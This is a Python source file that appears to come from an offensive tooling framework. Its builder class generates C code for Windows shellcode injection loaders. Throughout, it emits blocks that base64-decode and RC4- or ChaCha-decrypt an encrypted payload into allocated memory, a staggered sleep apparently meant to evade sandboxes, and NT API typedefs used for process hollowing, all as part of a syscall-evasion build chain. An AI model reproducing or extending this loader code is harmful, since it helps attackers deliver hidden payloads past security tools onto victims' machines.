#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Shared C preamble/decryption blocks for Windows injection loaders."""

from __future__ import annotations

from lib.compile.syscall_evasion import SyscallEvasionBuilder, _to_c_string


class InjectionBuilder(SyscallEvasionBuilder):
    """Base builder: encrypt shellcode and emit shared decode/decrypt C fragments."""

    def decrypt_block(self, key: bytes, iv=None, *, dest: str = "shellcode_buf") -> str:
        if self.cipher == "rc4":
            return f"""
            {_to_c_string(key, "key")}
            RC4(key, decoded, {dest}, payload_size);
"""
        if iv is None:
            raise ValueError("iv is required for chacha cipher")
        return f"""
            {_to_c_string(key, "key")}
            {_to_c_string(iv, "iv")}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, decoded, {dest}, payload_size);
"""

    def sleep_block(self) -> str:
        if self.sleep_ms <= 0:
            return ""
        return f"for (int i = 0; i < 10; i++) {{ Sleep({self.sleep_ms} / 10); }}"

    def decode_preamble(self, encoded_var: str = "enc_payload") -> str:
        return f"""
    int enc_len = (int)strlen({encoded_var});
    PBYTE decoded = (PBYTE)malloc(enc_len);
    if (!decoded) return 1;
    SIZE_T payload_size = (SIZE_T)base64decode(decoded, {encoded_var}, enc_len);
    if (payload_size <= 0) return 1;
    PBYTE shellcode_buf = (PBYTE)VirtualAlloc(NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!shellcode_buf) return 1;
"""

    def headers(self) -> list[str]:
        items = ['#include <windows.h>', '#include <string.h>', '#include "base64.h"']
        if self.cipher == "rc4":
            items.append('#include "rc4.h"')
        else:
            items.append('#include "chacha.h"')
        return items

    @staticmethod
    def ntdll_typedefs() -> str:
        return """
typedef long NTSTATUS;
typedef NTSTATUS (NTAPI *pNtUnmapViewOfSection)(HANDLE ProcessHandle, PVOID BaseAddress);
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PVOID PebBaseAddress;
    PVOID Reserved2[2];
    ULONG_PTR UniqueProcessId;
    PVOID Reserved3;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;
typedef NTSTATUS (NTAPI *pNtQueryInformationProcess)(
    HANDLE ProcessHandle,
    ULONG ProcessInformationClass,
    PVOID ProcessInformation,
    ULONG ProcessInformationLength,
    PULONG ReturnLength);
#define ProcessBasicInformation 0
"""

    @staticmethod
    def pe_macros() -> str:
        return """
#ifndef IMAGE_FIRST_SECTION
#define IMAGE_FIRST_SECTION(ntheader) ((PIMAGE_SECTION_HEADER)((ULONG_PTR)(ntheader) + \
    FIELD_OFFSET(IMAGE_NT_HEADERS, OptionalHeader) + \
    ((PIMAGE_NT_HEADERS)(ntheader))->FileHeader.SizeOfOptionalHeader))
#endif
"""
